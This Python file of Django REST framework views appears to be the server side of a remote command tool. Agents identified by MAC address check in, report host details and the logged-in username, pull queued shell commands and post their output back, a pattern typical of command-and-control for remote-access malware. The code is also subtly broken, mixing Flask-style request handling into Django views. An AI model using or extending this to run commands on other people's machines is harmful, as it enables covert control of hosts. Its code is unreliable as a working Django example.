from rest_framework import status
from rest_framework.decorators import api_view
from rest_framework.response import Response

from django.http import Http404

from .utils import Pipeline
from .models import Agent, Session, Agent_session

from datetime import datetime
import cgi


@api_view(['POST'])
def push_command(request, agent_identifier):
    """
    Adds the command to the command queue

    :param request:
    :return:
    """
    agent = Agent.objects.filter(identifier=agent_identifier)
    if not agent:
        raise Http404("Agent does not exist")

    agent = Agent.objects.get(identifier=agent_identifier)
    agent.push_cmd(request.form['cmdline'])
    return ''


@api_view(['POST'])
def get_command(request, agent_identifier):
    """
    Extracts the agent info from the request, updates the database and sends corresponding commands if any

    :param request:
    :param agent_identifier: The MAC address of the agent
    :return: the command to execute or ''
    """
    agent = Agent.objects.filter(identifier=agent_identifier)
    if not agent:
        agent = Agent.create(identifier=agent_identifier)
    else:
        agent = Agent.objects.get(identifier=agent_identifier)

    info = request.json

    # initialise or update basic information about the agent
    agent.operating_system = info['operating_system']
    agent.computer_name = info['computer_name']
    agent.username = info['username']

    agent.last_online = datetime.now()
    agent.remote_ip = request.remote_addr
    agent.save()

    # get commands to run
    cmdline = ''
    commands = agent.commands.order_by('timestamp')
    if commands:
        cmdline = commands[0].cmdline
        commands[0].delete()
    return cmdline


@api_view(['POST'])
def output_command(request, agent_identifier):
    """
    Extracts the output from the request, updates the database

    :param request:
    :param agent_identifier: The MAC address of the agent
    :return:
    """
    agent = Agent.objects.filter(identifier=agent_identifier)
    if not agent:
        raise Http404("Agent does not exist")
    else:
        agent = Agent.objects.get(identifier=agent_identifier)

    info = request.json
    output = info["output"]
    agent.output += cgi.escape(output)
    agent.save()
    return ''
